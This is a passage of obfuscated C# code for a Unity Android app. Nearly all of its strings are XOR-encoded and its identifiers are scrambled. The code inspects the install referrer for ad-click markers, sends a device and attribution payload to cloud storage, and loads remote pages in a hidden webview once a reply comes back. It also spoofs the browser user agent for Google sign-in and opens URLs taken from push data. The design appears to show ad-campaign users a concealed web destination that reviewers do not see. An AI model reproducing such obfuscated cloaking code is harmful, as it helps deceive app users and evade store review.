                    WLog(_0x2236f796._0xe98e57cc(new byte[28] { 97, 74, 80, 77, 79, 71, 110, 75, 73, 71, 2, 75, 76, 86, 71, 76, 86, 2, 68, 67, 78, 78, 64, 67, 65, 73, 24, 2 }, 34) + _0xd39f6d43);
                    if (_0xcba7199d(_0xd39f6d43))
                        return _0x36ed41e0(_0xd39f6d43, _0x8273867f);
                    return _0x284dd0bf(_0xd39f6d43);
                }

                WLog(_0x2236f796._0xe98e57cc(new byte[30] { 174, 133, 159, 130, 128, 136, 161, 132, 134, 136, 205, 132, 131, 153, 136, 131, 153, 205, 131, 130, 205, 133, 140, 131, 137, 129, 136, 159, 215, 205 }, 237) + _0xadad65c8);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x2236f796._0xe98e57cc(new byte[26] { 131, 168, 178, 175, 173, 165, 140, 169, 171, 165, 224, 169, 174, 180, 165, 174, 180, 224, 166, 161, 169, 172, 165, 164, 250, 224 }, 192) + e.Message);
            return true;
        }
    }

    private string _0x11b954a0;
    private string _0x33f22522 = "";
    private string _0xf6d2400e()
    {
        try
        {
            using (var _0x32dfd696 = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[30] { 46, 34, 32, 99, 56, 35, 36, 57, 52, 126, 41, 99, 61, 33, 44, 52, 40, 63, 99, 24, 35, 36, 57, 52, 29, 33, 44, 52, 40, 63 }, 77)))
            {
                var _0x1b271865 = _0x32dfd696.GetStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[15] { 175, 185, 190, 190, 169, 162, 184, 141, 175, 184, 165, 186, 165, 184, 181 }, 204));
                var _0x82196927 = _0x1b271865.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[21] { 12, 14, 31, 42, 27, 27, 7, 2, 8, 10, 31, 2, 4, 5, 40, 4, 5, 31, 14, 19, 31 }, 107));
                using (var _0x24f12f55 = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[26] { 143, 128, 138, 156, 129, 135, 138, 192, 153, 139, 140, 133, 135, 154, 192, 185, 139, 140, 189, 139, 154, 154, 135, 128, 137, 157 }, 238)))
                {
                    return _0x24f12f55.CallStatic<string>(_0x2236f796._0xe98e57cc(new byte[19] { 166, 164, 181, 133, 164, 167, 160, 180, 173, 181, 148, 178, 164, 179, 128, 166, 164, 175, 181 }, 193), _0x82196927);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    internal bool isApplicationPause = false;
    private string _0x75fb2b09 = "";
    public void _0xf769582c()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[18] { 202, 197, 244, 226, 229, 204, 177, 221, 240, 228, 255, 242, 249, 177, 214, 240, 252, 244 }, 145));
#endif
        }

        _0x53779211.Instance?._0x014cc000();
        _0xd5e1760c.Instance._0x14f99188(_0x778394b0._0x147ecbe6.DEFAULT);
    }

    private string _0x17a410ac(string _0x8d4fbb65, string _0x2afd8a1a)
    {
        if (string.IsNullOrEmpty(_0x2afd8a1a))
            return _0x8d4fbb65;
        if (_0x8d4fbb65.Contains(_0x2236f796._0xe98e57cc(new byte[1] { 175 }, 144)))
            return _0x8d4fbb65 + _0x2236f796._0xe98e57cc(new byte[8] { 254, 171, 189, 182, 188, 177, 188, 229 }, 216) + UnityWebRequest.EscapeURL(_0x2afd8a1a);
        else
            return _0x8d4fbb65 + _0x2236f796._0xe98e57cc(new byte[8] { 83, 31, 9, 2, 8, 5, 8, 81 }, 108) + UnityWebRequest.EscapeURL(_0x2afd8a1a);
    }

    private async void Start()
    {
        await _0xec67fa2f();
    }

    private void _0x22d666e6(string _0x37ee3a56)
    {
        Dictionary<string, object> _0x7f840949;
        try
        {
            _0x7f840949 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x37ee3a56);
        }
        catch
        {
            return;
        }

        var _0xb821d4d7 = ReadPushField(_0x7f840949, _0x2236f796._0xe98e57cc(new byte[3] { 202, 205, 211 }, 191));
        if (string.IsNullOrWhiteSpace(_0xb821d4d7))
            return;
        _0xb821d4d7 = _0xb821d4d7.Trim();
        if (!IsHttpUrl(_0xb821d4d7))
            return;
        if (string.Equals(_0xb821d4d7, _0x11b954a0, StringComparison.Ordinal))
            return;
        _0x11b954a0 = _0xb821d4d7;
        OpenUrlExternally(_0xb821d4d7);
    }

    private void _0x902e6d81()
    {
        if (_0x3d0f9fc1 != null)
            return;
        var _0xf6af8a10 = _0x645db8f3();
        _0x3d0f9fc1 = new GameObject(_0x2236f796._0xe98e57cc(new byte[14] { 156, 174, 169, 157, 162, 174, 188, 152, 187, 162, 165, 165, 174, 185 }, 203), typeof(RectTransform), typeof(Text));
        _0x11234eb3 = _0x3d0f9fc1.GetComponent<RectTransform>();
        _0x11234eb3.SetParent(_0xf6af8a10.transform, false);
        _0x11234eb3.anchorMin = new Vector2(0.5f, 0.5f);
        _0x11234eb3.anchorMax = new Vector2(0.5f, 0.5f);
        _0x11234eb3.pivot = new Vector2(0.5f, 0.5f);
        _0x11234eb3.sizeDelta = new Vector2(600f, 600f);
        _0x11234eb3.anchoredPosition = Vector2.zero;
        _0x5d109985 = _0x3d0f9fc1.GetComponent<Text>();
        _0x5d109985.text = _0x2236f796._0xe98e57cc(new byte[1] { 40 }, 7);
        _0x5d109985.font = Resources.GetBuiltinResource<Font>(_0x2236f796._0xe98e57cc(new byte[17] { 100, 77, 79, 73, 75, 81, 122, 93, 70, 92, 65, 69, 77, 6, 92, 92, 78 }, 40));
        _0x5d109985.fontSize = 200;
        _0x5d109985.alignment = TextAnchor.MiddleCenter;
        _0x5d109985.color = Color.white;
        _0x5d109985.raycastTarget = false;
        _0x3d0f9fc1.SetActive(false);
    }

    internal bool IsAboutBlank(string _0x7b15dd37)
    {
        if (string.IsNullOrEmpty(_0x7b15dd37))
            return false;
        return _0x7b15dd37.StartsWith(_0x2236f796._0xe98e57cc(new byte[11] { 234, 233, 228, 254, 255, 177, 233, 231, 234, 229, 224 }, 139), StringComparison.OrdinalIgnoreCase);
    }

    internal Vector2 lastSize = Vector2.zero;
    internal string _0x48e69e6b(string _0xdc926c17)
    {
        int _0xd23ee6f4 = _0xdc926c17.IndexOf(_0x2236f796._0xe98e57cc(new byte[3] { 52, 57, 96 }, 93), StringComparison.OrdinalIgnoreCase);
        if (_0xd23ee6f4 < 0)
            return null;
        string _0xed1cee3a = _0xdc926c17.Substring(_0xd23ee6f4 + 3);
        int _0x627f6b98 = _0xed1cee3a.IndexOf('&');
        return _0x627f6b98 >= 0 ? _0xed1cee3a.Substring(0, _0x627f6b98) : _0xed1cee3a;
    }

    private Task _0x978af948(IEnumerator _0x7befd85e)
    {
        var _0x2ce4f1a1 = new TaskCompletionSource<bool>();
        StartCoroutine(_0xe056c506(_0x7befd85e, _0x2ce4f1a1));
        return _0x2ce4f1a1.Task;
    }

    private void OnApplicationPause(bool _0x99d9fc52)
    {
        isApplicationPause = _0x99d9fc52;
    }

    private bool _0x3049ae7b = false;
    private bool _0xbb5d960a(int _0x26c71efe, string _0x325148a1, string _0xd4a5737d)
    {
        if (string.IsNullOrEmpty(_0xd4a5737d))
            return false;
        if (!IsHttpUrl(_0xd4a5737d))
            return true;
        if (string.IsNullOrEmpty(_0x325148a1))
            return false;
        return _0x325148a1.IndexOf(_0x2236f796._0xe98e57cc(new byte[20] { 17, 6, 6, 11, 23, 27, 26, 26, 17, 23, 0, 29, 27, 26, 11, 6, 17, 7, 17, 0 }, 84), StringComparison.OrdinalIgnoreCase) >= 0 || _0x325148a1.IndexOf(_0x2236f796._0xe98e57cc(new byte[22] { 235, 252, 252, 241, 237, 225, 224, 224, 235, 237, 250, 231, 225, 224, 241, 252, 235, 232, 251, 253, 235, 234 }, 174), StringComparison.OrdinalIgnoreCase) >= 0 || _0x325148a1.IndexOf(_0x2236f796._0xe98e57cc(new byte[21] { 250, 237, 237, 224, 252, 240, 241, 241, 250, 252, 235, 246, 240, 241, 224, 252, 243, 240, 236, 250, 251 }, 191), StringComparison.OrdinalIgnoreCase) >= 0 || _0x325148a1.IndexOf(_0x2236f796._0xe98e57cc(new byte[22] { 82, 69, 69, 72, 66, 89, 92, 89, 88, 64, 89, 72, 66, 69, 91, 72, 68, 84, 95, 82, 90, 82 }, 23), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private bool _0x02ac9266(string _0xd2294065)
    {
        if (string.IsNullOrEmpty(_0xd2294065))
            return false;
        try
        {
            using (var _0x65374af3 = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[30] { 40, 36, 38, 101, 62, 37, 34, 63, 50, 120, 47, 101, 59, 39, 42, 50, 46, 57, 101, 30, 37, 34, 63, 50, 27, 39, 42, 50, 46, 57 }, 75)))
            using (var _0x092026dc = _0x65374af3.GetStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[15] { 211, 197, 194, 194, 213, 222, 196, 241, 211, 196, 217, 198, 217, 196, 201 }, 176)))
            using (var _0x4fa9772c = _0x092026dc.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[17] { 100, 102, 119, 83, 98, 96, 104, 98, 100, 102, 78, 98, 109, 98, 100, 102, 113 }, 3)))
            using (var _0x9a72ce4c = _0x4fa9772c.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[25] { 104, 106, 123, 67, 110, 122, 97, 108, 103, 70, 97, 123, 106, 97, 123, 73, 96, 125, 95, 110, 108, 100, 110, 104, 106 }, 15), _0xd2294065))
            {
                if (_0x9a72ce4c == null)
                    return false;
                WLog(_0x2236f796._0xe98e57cc(new byte[37] { 54, 29, 7, 26, 24, 16, 57, 28, 30, 16, 85, 25, 20, 0, 27, 22, 29, 85, 28, 27, 6, 1, 20, 25, 25, 16, 17, 85, 5, 20, 22, 30, 20, 18, 16, 79, 85 }, 117) + _0xd2294065);
                _0x9a72ce4c.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[8] { 226, 231, 231, 197, 239, 226, 228, 240 }, 131), 0x10000000);
                _0x092026dc.Call(_0x2236f796._0xe98e57cc(new byte[13] { 215, 208, 197, 214, 208, 229, 199, 208, 205, 210, 205, 208, 221 }, 164), _0x9a72ce4c);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private Action _0x168a95cb;
    private IEnumerator _0x0c8073a1(string _0xa24b8114)
    {
        if (Permission.HasUserAuthorizedPermission(_0xa24b8114))
            yield break;
        bool _0xa17401eb = false;
        var _0x06ba2ff1 = new PermissionCallbacks();
        _0x06ba2ff1.PermissionGranted += _0xd824bb98 => _0xa17401eb = true;
        _0x06ba2ff1.PermissionDenied += _0xd824bb98 => _0xa17401eb = true;
        Permission.RequestUserPermission(_0xa24b8114, _0x06ba2ff1);
        yield return new WaitUntil(() => _0xa17401eb);
    }

    private void StopCurrentFailedLoad(UniWebView _0x6df3b7e7)
    {
        _0xc072dd30(false);
        if (_0x6df3b7e7 == null)
            return;
        _0x6df3b7e7.Stop();
        if (_0x6df3b7e7.CanGoBack)
            _0x6df3b7e7.GoBack();
    }

    internal void Update()
    {
        if (_0x047ed0fd == null)
            return;
        if (_0x59ca96e1())
            _0x1765a9cb();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x381a537f();
        if (_0xfc0c93b2 && _0x11234eb3 != null)
            _0x11234eb3.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private IEnumerator _0x41b95a7f()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[26] { 190, 177, 128, 150, 145, 184, 197, 172, 139, 140, 145, 140, 132, 137, 140, 159, 128, 183, 128, 131, 131, 128, 151, 128, 151, 197 }, 229));
            }
#endif
        }

        bool _0x6c61d01b = false;
        InstallReferrer.GetReferrer((_0x70898f6b) =>
        {
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[24] { 213, 218, 235, 253, 250, 174, 220, 235, 232, 235, 252, 252, 235, 252, 211, 174, 233, 235, 250, 174, 108, 8, 28, 174 }, 142) + _0x6399e15c);
            if (_0x70898f6b.IsSuccess)
            {
                _0x6399e15c = _0x70898f6b.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[28] { 108, 99, 82, 68, 67, 23, 101, 82, 81, 82, 69, 69, 82, 69, 106, 23, 100, 66, 84, 84, 82, 68, 68, 23, 213, 177, 165, 23 }, 55) + _0x6399e15c);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[27] { 236, 227, 210, 196, 195, 151, 229, 210, 209, 210, 197, 197, 210, 197, 234, 151, 241, 214, 222, 219, 210, 211, 151, 85, 49, 37, 151 }, 183) + _0x70898f6b);
#endif
                }

                _0x6399e15c = "";
            }

            _0x3dcbea2c = true;
        });
        StartCoroutine(_0x8e7b9bc1(2f));
        yield return new WaitUntil(() => _0x3dcbea2c);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0x6399e15c}");
#endif
        }

        bool _0xe588f089 = _0x6399e15c.Contains(_0x2236f796._0xe98e57cc(new byte[6] { 117, 113, 126, 123, 118, 47 }, 18));
        _0x6c61d01b = _0xe588f089 || _0x6399e15c.Contains(_0x2236f796._0xe98e57cc(new byte[18] { 247, 230, 230, 229, 184, 255, 248, 229, 226, 247, 241, 228, 247, 251, 184, 245, 249, 251 }, 150)) || _0x6399e15c.Contains(_0x2236f796._0xe98e57cc(new byte[17] { 253, 236, 236, 239, 178, 250, 253, 255, 249, 254, 243, 243, 247, 178, 255, 243, 241 }, 156));
        _0x0ccf5e18 = _0xe588f089 ? "" : (_0x6c61d01b ? "" : _0x0ccf5e18);
        _0x0ccf5e18 = _0x0ccf5e18 ?? "";
        _0xfc99f087 = _0xfc99f087 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x0ccf5e18}");
#endif
        }
    }

    private async Task _0x0832eb7b()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x19ad2fd9 = _0x2236f796._0xe98e57cc(new byte[5] { 42, 45, 32, 63, 41 }, 76);
        _0xcda2e357 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0xe3622dd0 = DateTime.UtcNow.Ticks.ToString();
        _0x94bc4b0e = "";
        JObject _0x47a8e7d6 = _0xf9cc4916(_0x04a78928, _0xccea9ae3, _0x0a9d3c31, _0x75fb2b09, _0x6399e15c, _0x0ccf5e18, _0xfc99f087, _0x10520025, _0x6068c37f, _0x2a3feac4, _0x19ad2fd9, _0x94bc4b0e, _0x458a368d, _0x3a1c301f, _0x9e651bdd.ToString(), _0xcf228d8c, _0xe3622dd0, _0xcda2e357, _0x33f22522, _0xeb25f0a5, _0x921e226e, _0x8f54f7db, _0x8343a468());
        var _0xde139fae = _0x7fcd18cc(_0x47a8e7d6.ToString(), _0x33f22522);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0x47a8e7d6}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x2236f796._0xe98e57cc(new byte[7] { 237, 252, 228, 241, 242, 252, 249 }, 157) + _0x33f22522, _0xde139fae } });
            await Task.Delay(500);
            string _0x7cf8b91e = "";
            for (int _0xfbacded1 = 0; _0xfbacded1 < 20; _0xfbacded1++)
            {
                if (await _0xbb82a337(1, 1))
                {
                    await _0x57a2abaa(_0x2236f796._0xe98e57cc(new byte[7] { 11, 5, 6, 10, 2, 12, 13 }, 105));
                    _0xf769582c();
                    return;
                }

                _0x7cf8b91e = await _0x360a9255(1, 500);
                if (!string.IsNullOrEmpty(_0x7cf8b91e))
                    break;
            }

            _0x8a7bf1c6(_0x7cf8b91e);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[22] { 96, 111, 126, 104, 111, 102, 27, 124, 94, 85, 94, 73, 90, 87, 27, 94, 73, 73, 84, 73, 1, 27 }, 59) + e.Message);
#endif
            }

            _0xf769582c();
        }
    }

    private void _0xff81ad3b()
    {
        using (var _0x543218a4 = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[30] { 235, 231, 229, 166, 253, 230, 225, 252, 241, 187, 236, 166, 248, 228, 233, 241, 237, 250, 166, 221, 230, 225, 252, 241, 216, 228, 233, 241, 237, 250 }, 136)))
        using (var _0x215dd938 = _0x543218a4.GetStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[15] { 243, 229, 226, 226, 245, 254, 228, 209, 243, 228, 249, 230, 249, 228, 233 }, 144)))
        using (var _0x1a4b5e71 = _0x215dd938.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[9] { 106, 104, 121, 68, 99, 121, 104, 99, 121 }, 13)))
        {
            if (_0x1a4b5e71 == null)
                return;
            using (var _0x4ae9b890 = _0x1a4b5e71.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[9] { 222, 220, 205, 252, 193, 205, 203, 216, 202 }, 185)))
            {
                if (_0x4ae9b890 == null)
                    return;
                using (var _0x95f3c3fd = new AndroidJavaObject(_0x2236f796._0xe98e57cc(new byte[19] { 62, 35, 54, 127, 59, 34, 62, 63, 127, 27, 2, 30, 31, 30, 51, 59, 52, 50, 37 }, 81)))
                using (var _0xccf8febf = _0x4ae9b890.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[6] { 68, 74, 86, 124, 74, 91 }, 47)))
                using (var _0x5aa931f2 = _0xccf8febf.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[8] { 97, 124, 109, 122, 105, 124, 103, 122 }, 8)))
                {
                    while (_0x5aa931f2.Call<bool>(_0x2236f796._0xe98e57cc(new byte[7] { 105, 96, 114, 79, 100, 121, 117 }, 1)))
                    {
                        string _0x7c705a23 = _0x5aa931f2.Call<string>(_0x2236f796._0xe98e57cc(new byte[4] { 160, 171, 182, 186 }, 206));
                        using (var _0x1dd23967 = _0x4ae9b890.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[3] { 254, 252, 237 }, 153), _0x7c705a23))
                        {
                            _0x95f3c3fd.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[3] { 25, 28, 29 }, 105), _0x7c705a23, _0x1dd23967);
                        }
                    }

                    string _0x5f8388c1 = _0x95f3c3fd.Call<string>(_0x2236f796._0xe98e57cc(new byte[8] { 77, 86, 106, 77, 75, 80, 87, 94 }, 57));
                    if (!string.IsNullOrEmpty(_0x5f8388c1))
                    {
                        _0x22d666e6(_0x5f8388c1);
                        _0x20e9c847(_0x5f8388c1);
                    }
                }
            }
        }
    }

    private void OnApplicationFocus(bool _0x3fd372bf)
    {
        isApplicationFocus = _0x3fd372bf;
        if (_0x3fd372bf && _0xf630cf5a)
        {
            _0xff81ad3b();
        }
    }

    private void _0xb8b54cb7()
    {
        if (_0x047ed0fd == null)
            return;
        if (_0x9fb9c897)
            _0x047ed0fd.SetUserAgent(_0x213c089a());
        else
            _0x047ed0fd.SetUserAgent("");
    }

    private IEnumerator _0xe056c506(IEnumerator _0xefe40c0b, TaskCompletionSource<bool> _0x77e3ac2d)
    {
        yield return _0xefe40c0b;
        _0x77e3ac2d.SetResult(true);
    }

    private RectTransform _0x11234eb3;
    private string _0x458a368d = "";
    private string _0xeb25f0a5 = "";
    internal Rect lastSafe = Rect.zero;
    private void _0xd90eb699(UniWebView _0xc7a47d05)
    {
        if (_0xbddd781f)
            return;
        _0xbddd781f = true;
        _0xc7a47d05.AddUrlScheme(_0x2236f796._0xe98e57cc(new byte[2] { 157, 142 }, 233));
        _0xc7a47d05.AddUrlScheme(_0x2236f796._0xe98e57cc(new byte[6] { 249, 254, 228, 245, 254, 228 }, 144));
        _0xc7a47d05.AddUrlScheme(_0x2236f796._0xe98e57cc(new byte[6] { 240, 252, 239, 246, 248, 233 }, 157));
        _0xc7a47d05.OnMessageReceived += (_0x1af7ea0d, _0x60bdbdbb) =>
        {
            if (TryOpenExternalLikeChrome(_0x60bdbdbb.RawMessage))
            {
                _0xc072dd30(false);
                return;
            }
        };
        _0xc7a47d05.RegisterShouldHandleRequest(_0x7b2fd156 =>
        {
            string _0xbdf2af49 = _0x7b2fd156 != null ? _0x7b2fd156.Url : string.Empty;
            if (string.IsNullOrEmpty(_0xbdf2af49))
                return true;
            WLog(_0x2236f796._0xe98e57cc(new byte[21] { 88, 99, 100, 126, 103, 111, 67, 106, 101, 111, 103, 110, 89, 110, 122, 126, 110, 120, 127, 49, 43 }, 11) + _0xbdf2af49);
            if (TryOpenExternalLikeChrome(_0xbdf2af49))
            {
                _0xc072dd30(false);
                return false;
            }

            if (_0x7b2fd156 != null && _0x7b2fd156.IsMainFrame && IsGoogleAuthFlowUrl(_0xbdf2af49) && !_0x9fb9c897)
            {
                WLog(_0x2236f796._0xe98e57cc(new byte[62] { 238, 194, 202, 205, 131, 244, 198, 193, 245, 202, 198, 212, 131, 199, 198, 215, 198, 192, 215, 198, 199, 131, 228, 204, 204, 196, 207, 198, 131, 194, 214, 215, 203, 131, 246, 241, 239, 131, 142, 157, 131, 209, 198, 207, 204, 194, 199, 131, 212, 202, 215, 203, 131, 228, 204, 204, 196, 207, 198, 131, 246, 226 }, 163));
                _0x9fb9c897 = true;
                _0xc072dd30(true);
                _0x047ed0fd.SetUserAgent(_0x213c089a());
                _0x047ed0fd.Load(_0xbdf2af49);
                return false;
            }

            return true;
        });
        _0xc7a47d05.OnLoadingErrorReceived += (_0x1af7ea0d, _0x0867f86e, _0x60bdbdbb, _0x3b055478) =>
        {
            WLog(_0x2236f796._0xe98e57cc(new byte[25] { 92, 112, 120, 127, 49, 70, 116, 115, 71, 120, 116, 102, 49, 84, 99, 99, 126, 99, 43, 49, 114, 126, 117, 116, 44 }, 17) + _0x0867f86e + _0x2236f796._0xe98e57cc(new byte[9] { 107, 38, 46, 56, 56, 42, 44, 46, 118 }, 75) + _0x60bdbdbb);
            string _0x69756b09 = GetFailingUrl(_0x3b055478);
            if (string.IsNullOrEmpty(_0x69756b09) || IsAboutBlank(_0x69756b09))
                return;
            _ = _0x57a2abaa(_0x2236f796._0xe98e57cc(new byte[8] { 202, 203, 226, 216, 207, 207, 210, 207 }, 189));
            WLog(_0x2236f796._0xe98e57cc(new byte[45] { 185, 149, 157, 154, 212, 163, 145, 150, 162, 157, 145, 131, 212, 146, 149, 157, 152, 157, 154, 147, 212, 161, 166, 184, 212, 217, 202, 212, 155, 132, 145, 154, 212, 145, 140, 128, 145, 134, 154, 149, 152, 152, 141, 206, 212 }, 244) + _0x69756b09);
            StopCurrentFailedLoad(_0x1af7ea0d);
            _0xae64159e(_0x69756b09);
        };
        _0xc7a47d05.OnPageStarted += (_0x1af7ea0d, _0xf35857d0) =>
        {
            _0x53b77e95 = 0;
            if (_0x5deee036 && IsAboutBlank(_0xf35857d0))
            {
                WLog(_0x2236f796._0xe98e57cc(new byte[27] { 60, 30, 9, 27, 13, 30, 1, 76, 13, 14, 3, 25, 24, 86, 14, 0, 13, 2, 7, 76, 31, 24, 13, 30, 24, 9, 8 }, 108));
                return;
            }

            WLog(_0x2236f796._0xe98e57cc(new byte[29] { 80, 124, 116, 115, 61, 74, 120, 127, 75, 116, 120, 106, 61, 82, 115, 77, 124, 122, 120, 78, 105, 124, 111, 105, 120, 121, 39, 61, 54 }, 29) + (Time.realtimeSinceStartup - _0x4131c309).ToString(_0x2236f796._0xe98e57cc(new byte[5] { 155, 133, 155, 155, 155 }, 171)) + _0x2236f796._0xe98e57cc(new byte[2] { 113, 34 }, 2) + _0xf35857d0);
            if (TryOpenExternalLikeChrome(_0xf35857d0))
            {
                StopCurrentFailedLoad(_0x1af7ea0d);
                return;
            }

            if (ContainsIgnoreCase(_0xf35857d0, _0x2236f796._0xe98e57cc(new byte[8] { 197, 200, 200, 192, 143, 192, 209, 209 }, 161)) || ContainsIgnoreCase(_0xf35857d0, _0x2236f796._0xe98e57cc(new byte[15] { 195, 210, 202, 157, 196, 218, 215, 212, 214, 199, 157, 209, 223, 220, 212 }, 179)) || _0xf35857d0.StartsWith(_0x2236f796._0xe98e57cc(new byte[25] { 198, 218, 218, 222, 221, 148, 129, 129, 204, 222, 201, 194, 193, 204, 207, 194, 200, 207, 216, 128, 194, 199, 216, 203, 129 }, 174), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x1af7ea0d);
                OpenUrlExternally(_0xf35857d0);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0xf35857d0))
            {
                _0xc072dd30(true);
                WLog(_0x2236f796._0xe98e57cc(new byte[41] { 113, 89, 89, 81, 90, 83, 22, 87, 67, 66, 94, 22, 80, 90, 89, 65, 22, 82, 83, 66, 83, 85, 66, 83, 82, 22, 27, 8, 22, 93, 83, 83, 70, 22, 64, 95, 69, 95, 84, 90, 83 }, 54));
                return;
            }

            _0x3049ae7b = true;
            _0xc072dd30(true);
            WLog(_0x2236f796._0xe98e57cc(new byte[43] { 61, 15, 8, 60, 3, 15, 29, 74, 6, 5, 11, 14, 3, 4, 13, 69, 24, 15, 14, 3, 24, 15, 9, 30, 3, 4, 13, 74, 71, 84, 74, 1, 15, 15, 26, 74, 28, 3, 25, 3, 8, 6, 15 }, 106));
        };
        _0xc7a47d05.OnPageCommitted += (_0x1af7ea0d, _0xf35857d0) =>
        {
            if (_0x5deee036 && IsAboutBlank(_0xf35857d0))
                return;
            WLog(_0x2236f796._0xe98e57cc(new byte[31] { 150, 186, 178, 181, 251, 140, 190, 185, 141, 178, 190, 172, 251, 148, 181, 139, 186, 188, 190, 152, 180, 182, 182, 178, 175, 175, 190, 191, 225, 251, 240 }, 219) + (Time.realtimeSinceStartup - _0x4131c309).ToString(_0x2236f796._0xe98e57cc(new byte[5] { 221, 195, 221, 221, 221 }, 237)) + _0x2236f796._0xe98e57cc(new byte[2] { 128, 211 }, 243) + _0xf35857d0);
            if (!firstLoadShown && IsHttpUrl(_0xf35857d0))
            {
                firstLoadShown = true;
                _0x3049ae7b = false;
                _0xc072dd30(false);
                _0xddb4ce76();
                _0x381a537f();
                _0x1af7ea0d.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x57a2abaa(_0x2236f796._0xe98e57cc(new byte[9] { 109, 108, 69, 117, 106, 127, 116, 127, 126 }, 26));
                WLog(_0x2236f796._0xe98e57cc(new byte[39] { 107, 71, 79, 72, 6, 113, 67, 68, 112, 79, 67, 81, 6, 85, 78, 73, 81, 72, 6, 73, 72, 6, 69, 73, 75, 75, 79, 82, 82, 67, 66, 6, 69, 73, 72, 82, 67, 72, 82 }, 38));
            }
        };
        _0xc7a47d05.OnPageProgressChanged += (_0x1af7ea0d, _0x5b8e1e59) =>
        {
            if (_0x5deee036)
                return;
            if (!firstLoadShown && _0x5b8e1e59 >= 0.65f)
            {
                firstLoadShown = true;
                _0x3049ae7b = false;
                _0xc072dd30(false);
                _0xddb4ce76();
                _0x381a537f();
                _0x1af7ea0d.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x57a2abaa(_0x2236f796._0xe98e57cc(new byte[9] { 88, 89, 112, 64, 95, 74, 65, 74, 75 }, 47));
                WLog(_0x2236f796._0xe98e57cc(new byte[32] { 70, 106, 98, 101, 43, 92, 110, 105, 93, 98, 110, 124, 43, 120, 99, 100, 124, 101, 43, 105, 114, 43, 123, 121, 100, 108, 121, 110, 120, 120, 49, 43 }, 11) + _0x5b8e1e59);
            }
        };
        _0xc7a47d05.OnPageFinished += (_0x1af7ea0d, _0x0867f86e, _0xf35857d0) =>
        {
            if (_0x5deee036 && IsAboutBlank(_0xf35857d0))
            {
                _0x5deee036 = false;
                WLog(_0x2236f796._0xe98e57cc(new byte[28] { 192, 226, 245, 231, 241, 226, 253, 176, 241, 242, 255, 229, 228, 170, 242, 252, 241, 254, 251, 176, 246, 249, 254, 249, 227, 248, 245, 244 }, 144));
                return;
            }

            WLog(_0x2236f796._0xe98e57cc(new byte[24] { 18, 62, 54, 49, 127, 8, 58, 61, 9, 54, 58, 40, 127, 25, 54, 49, 54, 44, 55, 58, 59, 101, 127, 116 }, 95) + (Time.realtimeSinceStartup - _0x4131c309).ToString(_0x2236f796._0xe98e57cc(new byte[5] { 227, 253, 227, 227, 227 }, 211)) + _0x2236f796._0xe98e57cc(new byte[7] { 123, 40, 107, 103, 108, 109, 53 }, 8) + _0x0867f86e + _0x2236f796._0xe98e57cc(new byte[5] { 85, 0, 7, 25, 72 }, 117) + _0xf35857d0);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x3049ae7b = false;
                _0xc072dd30(false);
                _0xddb4ce76();
                _0x381a537f();
                _0x1af7ea0d.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x57a2abaa(_0x2236f796._0xe98e57cc(new byte[9] { 196, 197, 236, 220, 195, 214, 221, 214, 215 }, 179));
                WLog(_0x2236f796._0xe98e57cc(new byte[33] { 65, 109, 101, 98, 44, 91, 105, 110, 90, 101, 105, 123, 44, 106, 101, 126, 127, 120, 44, 96, 99, 109, 104, 44, 111, 99, 97, 124, 96, 105, 120, 105, 104 }, 12));
            }
            else if (_0x3049ae7b)
            {
                _0x3049ae7b = false;
                _0xc072dd30(false);
                _0x1af7ea0d.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x2236f796._0xe98e57cc(new byte[40] { 48, 28, 20, 19, 93, 42, 24, 31, 43, 20, 24, 10, 93, 46, 21, 18, 10, 93, 28, 27, 9, 24, 15, 93, 17, 18, 28, 25, 20, 19, 26, 93, 27, 20, 19, 20, 14, 21, 24, 25 }, 125));
            }
            else
